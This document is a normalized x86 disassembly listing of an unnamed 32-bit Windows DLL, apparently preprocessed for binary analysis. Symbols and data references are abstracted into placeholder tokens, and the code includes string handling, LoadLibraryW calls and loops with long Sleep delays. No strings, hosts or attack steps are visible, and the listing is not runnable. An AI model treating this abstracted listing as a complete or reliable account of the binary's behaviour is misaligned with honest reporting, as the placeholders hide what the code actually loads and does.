cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_1000197b
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_10001ca7
call sub_100142eb
retn 0x8
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1000102e
add esp 0x10
sub_100021ba
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000241d
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_10002241
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x10
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
add ecx eax
cmp ecx [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_1000227c
push 0x8
mov eax sub_10026d6b
call sub_10014246
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax edi
pop ebx
div ebx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov edi [ ebp + 0xc ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ edi + 0x1 ]
call sub_10002393
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
lea edi [ edx + ecx ]
push 0x0
push 0x1
call sub_10001a52
mov ecx [ ebp + 0x10 ]
mov eax esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x18 ] edi
call sub_10001e05
call sub_100142eb
retn 0xc
cmp [ esi + 0x18 ] 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp + 0x10 ]
push ebx
call sub_100023dd
add esp 0xc
sub_10002357
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_10002393
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_10010c96
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10010806
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10013de1
int3
sub_100023fc
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10002553
add esp 0xc
pop edi
leave
retn 0x4
sub_1000241d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_10010c96
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10010806
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10013de1
int3
sub_1000247f
push 0x8
mov eax sub_1002726e
call sub_10014246
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
call sub_100142eb
retn
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_100024d2
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x1c
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
sub_100024d2
push 0x8
mov eax sub_10027253
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
call sub_100142eb
retn 0x4
push [ ebp + 0x8 ]
call sub_10001738
sub_100024fe
push 0x8
mov eax sub_1002752d
call sub_10014246
mov esi ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_100142eb
retn
mov ecx [ ebp + 0xc ]
push esi
call sub_100024d2
add [ ebp + 0xc ] 0x1c
add esi 0x1c
jmp r-xdata
cmp esi [ ebp + 0x8 ]
je r-xdata
sub_1000252d
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0xc ]
jne r-xdata
push 0x1
call sub_10001a52
add esi 0x1c
push 0x0
call sub_10013de1
mov eax [ ebp + 0xc ]
call sub_100142eb
retn
sub_10002553
push 0x2c
mov eax sub_10027508
call sub_100142b2
xor ebx ebx
mov edi edx
xor eax eax
mov esi ecx
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push ebx
push 0x1
lea esi [ ebp - 0x30 ]
call sub_10001a52
mov eax edi
call sub_1001430e
retn
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call sub_100024d2
push edi
mov ecx esi
call sub_100025d6
add edi 0x1c
pop ecx
mov [ ebp - 0x34 ] edi
add esi 0x1c
jmp r-xdata
cmp esi [ ebp + 0x8 ]
je r-xdata
sub_100025a6
mov esi [ ebp - 0x38 ]
jmp r-xdata
push 0x0
cmp esi [ ebp - 0x34 ]
jne r-xdata
push 0x1
call sub_10001a52
add esi 0x1c
push 0x0
call sub_10013de1
push ebx
push 0x1
lea esi [ ebp - 0x30 ]
call sub_10001a52
mov eax edi
call sub_1001430e
retn
sub_100025d6
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn
push ebx
push esi
push edi
lea edx [ eax + 0x4 ]
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ebx [ ecx + 0x4 ]
mov edi edx
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ebx
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
pop edi
mov [ eax + 0x18 ] esi
pop esi
mov [ ecx + 0x18 ] edx
pop ebx
sub_1000263d
push 0x3c
mov eax sub_10027d19
call sub_10014213
mov ebx ecx
mov edi [ ebp + 0x8 ]
push sub_10002637
mov esi edi
call sub_1000bd8c
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x18 ]
push eax
mov ecx ebx
mov [ edi ] r--data
call sub_10001530
push ebx
lea eax [ edi + 0xd4 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000179f
add ebx 0x18
push ebx
lea esi [ edi + 0xec ]
mov [ ebp - 0x4 ] 0x2
call sub_10001738
lea eax [ edi + 0x108 ]
xor ecx ecx
mov [ eax + 0x18 ] 0x7
call sub_10001e05
push r--data
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000170e
mov eax esi
lea ebx [ edi + 0x124 ]
mov [ ebp - 0x4 ] 0x5
push eax
lea esi [ ebx + 0x4 ]
mov [ ebx ] r--data
call sub_10001738
and [ ebx + 0x20 ] 0x0
push 0x0
push 0x1
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001a52
push r--data
lea esi [ ebp - 0x44 ]
call sub_1000170e
mov eax esi
lea ebx [ edi + 0x148 ]
mov [ ebp - 0x4 ] 0x8
push eax
lea esi [ ebx + 0x4 ]
mov [ ebx ] r--data
call sub_10001738
and [ ebx + 0x20 ] 0x0
push 0x0
push 0x1
lea esi [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0xa
call sub_10001a52
push 0x4
lea esi [ edi + 0x16c ]
call sub_10010c96
pop ecx
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
mov eax edi
call sub_100142eb
retn 0x4
sub_1000276e
push 0x4
mov eax sub_1002722a
call sub_10014213
mov ebx ecx
mov [ ebp - 0x10 ] ebx
mov [ ebx ] r--data
lea eax [ ebx + 0x16c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_1000386e
lea ecx [ ebx + 0x148 ]
mov [ ebp - 0x4 ] 0x5
call sub_10008760
lea ecx [ ebx + 0x124 ]
mov [ ebp - 0x4 ] 0x4
call sub_10008760
push 0x0
push 0x1
lea esi [ ebx + 0x108 ]
call sub_10001a52
push 0x0
push 0x1
lea esi [ ebx + 0xec ]
call sub_10001a52
lea esi [ ebx + 0xd4 ]
call sub_10001b71
push [ esi ]
call sub_10010ba2
pop ecx
lea edi [ ebx + 0x18 ]
call sub_100014cd
mov ecx ebx
mov [ ebx ] r--data
call sub_1000bd6b
call sub_100142eb
retn
sub_1000281a
push 0x64
mov eax sub_100271ad
call sub_1001427c
mov eax [ edx + 0x14 ]
cmp eax [ edi + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
push ecx
sub eax ecx
push eax
push edx
lea esi [ ebp - 0x2c ]
call sub_10003840
and [ ebp - 0x4 ] 0x0
call sub_1000fcc0
mov [ ebp - 0x34 ] eax
call sub_1000faee
mov ecx eax
call sub_100086fb
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x1
call sub_1000641e
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x4 ] 0x2
call sub_1000fcc0
mov [ ebp - 0x38 ] eax
call sub_1000faee
mov ecx eax
call sub_100086fb
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_1000641e
pop ecx
pop ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_10006439
push 0x0
push 0x1
lea esi [ ebp - 0x54 ]
mov [ ebp - 0x2d ] al
call sub_10001a52
lea ecx [ ebp - 0x38 ]
call sub_100086e3
push 0x0
push 0x1
lea esi [ ebp - 0x70 ]
call sub_10001a52
lea ecx [ ebp - 0x34 ]
call sub_100086e3
push 0x0
push 0x1
lea esi [ ebp - 0x2c ]
call sub_10001a52
mov al [ ebp - 0x2d ]
xor al al
jmp r-xdata
call sub_100142ff
retn
sub_100028ed
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x10 ]
call sub_10002127
call sub_10010b92
cmp eax [ esp + 0x18 ]
je r-xdata
xor al al
lea esi [ esp + 0x10 ]
call sub_100038b5
mov edx [ ebp + 0x8 ]
mov edi eax
call sub_1000281a
cmp al 0x1
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x1c ]
je r-xdata
mov al 0x1
jmp r-xdata
call sub_100038dd
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0xc ]
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x18 ]
call sub_10002127
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_1000298c
lea eax [ ebp - 0x30 ]
push eax
call sub_10002802
pop ecx
lea edi [ esi + 0xec ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000281a
test al al
je r-xdata
lea eax [ esi + 0xd4 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100028ed
pop ecx
pop ecx
test al al
mov eax [ esi ]
mov ecx esi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc ]
jmp r-xdata
call [ eax + 0x14 ]
call [ eax + 0x14 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
jmp r-xdata
push 0x0
push 0x1
lea esi [ ebp - 0x30 ]
call sub_10001a52
call sub_1001430e
retn
sub_100029f3
push 0x260
mov eax sub_10027c81
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x250 ] eax
call sub_1000a70c
mov ebx r--data
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x24c ] r--data
lea eax [ ebp - 0x24c ]
xor esi esi
push eax
lea edi [ ebp - 0x240 ]
mov [ ebp - 0x4 ] esi
call sub_1000a78c
test al al
jne r-xdata
lea eax [ ebp - 0x21c ]
push eax
lea esi [ ebp - 0x26c ]
call sub_1000170e
push [ ebp - 0x250 ]
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100028ed
pop ecx
pop ecx
push 0x0
push 0x1
mov [ ebp - 0x241 ] al
mov [ ebp - 0x4 ] 0x0
call sub_10001a52
cmp [ ebp - 0x241 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x24c ]
mov [ ebp - 0x24c ] ebx
call sub_1000bd6b
mov eax esi
call sub_100142ff
retn
mov esi [ ebp - 0x238 ]
jmp r-xdata
lea eax [ ebp - 0x24c ]
push eax
lea edi [ ebp - 0x240 ]
call sub_1000a838
test al al
jne r-xdata
xor esi esi
jmp r-xdata
sub_10002ac3
push ebp
sub esp 0x98
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x98 ] eax
push 0x10c
mov eax sub_10028429
call sub_10014246
push r--data
lea esi [ ebp + 0x28 ]
call sub_1000170e
xor ebx ebx
push r--data
lea esi [ ebp + 0x44 ]
mov [ ebp - 0x4 ] ebx
call sub_1000170e
lea eax [ ebp - 0x74 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10003518
mov ecx esi
push ecx
push eax
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000645b
push r--data
push eax
lea eax [ ebp + 0x60 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100064a6
add esp 0x1c
push ebx
push 0x1
lea esi [ ebp - 0x58 ]
call sub_10001a52
push ebx
push 0x1
lea esi [ ebp - 0x74 ]
call sub_10001a52
push __dos_header
lea ecx [ ebp + 0x7c ]
mov [ ebp - 0x4 ] 0x7
call sub_1000a62e
pop ecx
mov [ ebp - 0x4 ] 0x8
cmp [ ebp + 0x78 ] 0x8
mov eax [ ebp + 0x64 ]
jae r-xdata
mov edi [ ebp + 0x74 ]
mov ecx [ ebp + 0x90 ]
push eax
lea eax [ ebp + 0x7c ]
call sub_10006eee
cmp eax ebx
je r-xdata
lea eax [ ebp + 0x64 ]
push ebx
push 0x1
lea esi [ ebp + 0x7c ]
call sub_10001a52
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
lea eax [ ebp + 0x60 ]
push eax
lea ecx [ ebp + 0x7c ]
call sub_1000a8e4
pop ecx
lea eax [ ebp - 0x118 ]
push eax
call sub_10003908
push r--data
lea eax [ ebp - 0x110 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0xa
call sub_100064fa
push eax
lea ecx [ ebp + 0x60 ]
call sub_10006651
add esp 0xc
push eax
call sub_100064fa
push eax
call sub_100067da
add esp 0xc
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x118 ]
call sub_100039c7
lea ecx [ ebp + 0x28 ]
push ecx
lea ecx [ ebp ]
push ecx
mov esi eax
mov [ ebp - 0x4 ] 0xb
call sub_1000bba0
pop ecx
pop ecx
push ebx
push 0x1
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0xd
call sub_10001a52
push r--data
lea esi [ ebp - 0x3c ]
call sub_1000170e
push r--data
lea esi [ ebp + 0x7c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000170e
mov eax esi
push eax
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xf
call sub_1000b646
push ebx
push 0x1
call sub_10001a52
push ebx
push 0x1
lea esi [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x12
call sub_10001a52
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp ]
call sub_1000ba0f
lea ecx [ ebp - 0x20 ]
call sub_1000b788
lea edi [ ebp ]
mov [ ebp - 0x4 ] 0xa
call sub_1000bae7
lea eax [ ebp - 0x118 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002d01
push ebx
push 0x1
lea esi [ ebp + 0x60 ]
call sub_10001a52
push ebx
push 0x1
lea esi [ ebp + 0x44 ]
call sub_10001a52
push ebx
push 0x1
lea esi [ ebp + 0x28 ]
call sub_10001a52
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x98 ]
xor ecx ebp
call sub_10010789
add ebp 0x9c
leave
retn
sub_10002d1d
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028209
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea eax [ esp + 0xc ]
push eax
call sub_10001766
and [ esp + 0x30 ] 0x0
lea eax [ esi + 0xec ]
push eax
lea eax [ esp + 0x10 ]
call sub_1000185c
lea eax [ esp + 0xc ]
push eax
lea ebx [ esi + 0x124 ]
call sub_1000322a
pop ecx
lea esi [ esp + 0xc ]
call sub_10001b71
push [ esp + 0xc ]
call sub_10010ba2
pop ecx
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10002d9f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1002856e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi ecx
lea ecx [ esp + 0x10 ]
call sub_100032a0
xor esi esi
push 0xffffffff
push esi
lea ecx [ edi + 0x108 ]
mov [ esp + 0x40 ] esi
call sub_100019c6
or [ esp + 0x38 ] 0xffffffff
push esi
push 0x1
lea esi [ esp + 0x18 ]
call sub_10001a52
lea ecx [ edi + 0x124 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push 0xfa0
call [ Sleep@IAT ]
mov ecx edi
call sub_10002e18
sub_10002e18
push 0x11c
mov eax sub_1002853e
call sub_100142b2
mov esi ecx
mov [ ebp - 0xe4 ] esi
cmp [ ebp - 0x1c ] edi
ja r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ebx [ ebp - 0x4c ]
call sub_10003067
push 0x24
mov [ ebp - 0x4 ] 0x7
call sub_10010c96
mov esi eax
pop ecx
mov [ ebp - 0xf0 ] esi
mov [ ebp - 0x4 ] 0x8
cmp esi edi
je r-xdata
mov ecx [ ebp - 0xe4 ]
lea eax [ ebp - 0xe0 ]
add ecx 0x18
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10008b90
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x4
call sub_100016bc
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x5
call sub_10008c77
push edi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1000197b
lea ecx [ ebp - 0xe0 ]
call sub_10008c2a
mov [ ebp - 0x4 ] edi
jmp r-xdata
xor esi esi
push edi
call sub_1000bd8c
mov [ ebp - 0x4 ] 0x9
mov [ esi ] r--data
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
lea ebx [ esi + 0x18 ]
jae r-xdata
cmp [ ebp - 0x1c ] edi
jbe r-xdata
mov ecx [ ebp - 0xe4 ]
call sub_10003491
lea eax [ ebp - 0xe8 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000863f
push edi
push 0x1
lea esi [ ebp - 0x4c ]
call sub_10001a52
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
push eax
call [ LoadLibraryW@IAT ]
push r--data
lea ecx [ ebp - 0x128 ]
mov edi eax
call sub_100016bc
lea eax [ ebp - 0x128 ]
push eax
test edi edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0xa
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1000197b
mov [ ebx + 0x4 ] edi
mov [ ebx ] r--data
push r--data
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0xb
call sub_100016bc
lea eax [ ebp - 0x10c ]
push eax
push ebx
mov [ ebp - 0x4 ] 0xc
call sub_1000a5c7
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
mov [ esi + 0x20 ] eax
call sub_1000197b
xor edi edi
jmp r-xdata
lea eax [ ebp - 0x48 ]
push 0x927c0
call [ Sleep@IAT ]
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
mov esi [ ebp - 0xe4 ]
jmp r-xdata
xor edi edi
push edi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x18 ] 0xf
call sub_10001ca7
lea ebx [ esi + 0x148 ]
add esi 0xd4
mov [ ebp - 0x4 ] edi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1000322a
mov eax [ ebx ]
pop ecx
lea ecx [ ebp - 0x30 ]
push ecx
mov ecx ebx
call [ eax + 0xc ]
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
push esi
lea ecx [ ebp - 0xe8 ]
mov [ ebp - 0xec ] esi
call sub_10007238
push esi
lea eax [ ebp - 0xec ]
push esi
push eax
call sub_1000102d
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0xec ]
add esp 0x4
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0xe8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0xe8 ]
mov [ ebp - 0xf0 ] esp
cmp eax edi
je r-xdata
sub_10003067
push 0xf0
mov eax sub_1002801a
call sub_1001427c
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
and [ ebp - 0x38 ] 0x0
push r--data
lea esi [ ebp - 0x58 ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] eax
call sub_1000170e
mov eax esi
push eax
xor edi edi
lea eax [ ebp - 0x30 ]
inc edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a953
pop ecx
pop ecx
push 0x0
push edi
mov [ ebp - 0x4 ] 0x3
call sub_10001a52
lea edx [ ebp - 0x30 ]
lea ecx [ ebp - 0x74 ]
call sub_1000ab65
push r--data
push eax
push ebx
mov [ ebp - 0x4 ] 0x4
call sub_100064a6
add esp 0xc
push 0x0
push edi
lea esi [ ebp - 0x74 ]
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x4 ] 0x3
call sub_10001a52
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
push eax
lea eax [ ebp - 0xfc ]
push eax
call sub_10003eff
push [ ebp - 0x34 ]
lea eax [ ebp - 0xfc ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10006987
pop ecx
pop ecx
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x3
call sub_10003fba
lea eax [ ebp - 0xa8 ]
push eax
mov [ ebp - 0xa8 ] r--data
call sub_1000fec1
pop ecx
push 0x0
push edi
lea esi [ ebp - 0x30 ]
call sub_10001a52
mov eax ebx
call sub_100142ff
retn 0x4
sub_1000316b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10027c3d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xd0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe8 ]
mov [ fs : 0x0 ] eax
and [ esp + 0x10 ] 0x0
mov edi ecx
lea esi [ edi + 0x148 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov [ esp + 0x14 ] r--data
and [ esp + 0xf0 ] 0x0
and [ esp + 0xd4 ] 0x0
xor ebx ebx
lea eax [ esp + 0x18 ]
inc ebx
lea ecx [ edi + 0x18 ]
push eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0xdc ] r--data
call sub_10001530
mov [ esp + 0xf0 ] ebx
mov ecx [ esp + 0x14 ]
mov ecx [ ecx + 0x4 ]
mov eax [ esi ]
lea ecx [ esp + ecx + 0x14 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
jmp r-xdata
sub_1000322a
push 0x8
mov eax sub_100281e6
call sub_10014213
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
jne r-xdata
call sub_100142eb
retn
mov esi [ Sleep@IAT ]
mov [ ebp - 0x14 ] r--data
mov edi 0x7d0
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100029f3
pop ecx
mov [ ebp - 0x10 ] eax
push edi
test eax eax
je r-xdata
call esi
call esi
push [ ebp - 0x10 ]
and [ ebp - 0x4 ] 0x0
call sub_1000a1f6
push edi
call esi
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
jne r-xdata
push 0x186a0
call esi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
sub_100032a0
push 0x15c
mov eax sub_1002839b
call sub_100142b2
and [ ebp - 0x98 ] 0x0
mov edi ecx
push r--data
lea esi [ ebp - 0xe0 ]
mov [ ebp - 0x94 ] edi
call sub_1000170e
xor ebx ebx
inc ebx
push r--data
lea esi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] ebx
call sub_1000170e
mov eax esi
push eax
lea ecx [ ebp - 0xe0 ]
lea edx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000b646
push 0x0
push ebx
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0xe0 ]
call sub_10001a52
push r--data
lea esi [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000170e
mov eax esi
push eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_1000b7a5
push 0x0
push ebx
mov [ ebp - 0x4 ] 0x9
call sub_10001a52
push edi
lea eax [ ebp - 0x68 ]
push eax
call sub_1000bb26
lea edi [ ebp - 0x68 ]
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x4 ] 0x6
call sub_1000bae7
lea ecx [ ebp - 0xa4 ]
call sub_1000b788
mov eax [ ebp - 0x94 ]
call sub_1001430e
retn
sub_10003379
mov eax [ ebp - 0xa8 ]
cmp [ eax + 0x28 ] 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_1000bd0e
mov esi eax
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
lea eax [ ebp - 0x168 ]
push eax
movsd [ edi ] [ esi ]
call sub_10003908
push r--data
push ecx
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov [ ebp - 0x4 ] 0xb
push [ ebp - 0x1e ]
lea eax [ ebp - 0x160 ]
push ecx
push [ ebp - 0x20 ]
push ecx
push [ ebp - 0x24 ]
push eax
call sub_1000366c
pop ecx
push eax
call sub_1000357b
pop ecx
push eax
call sub_1000357b
pop ecx
push eax
call sub_10003756
pop ecx
push eax
call sub_100064fa
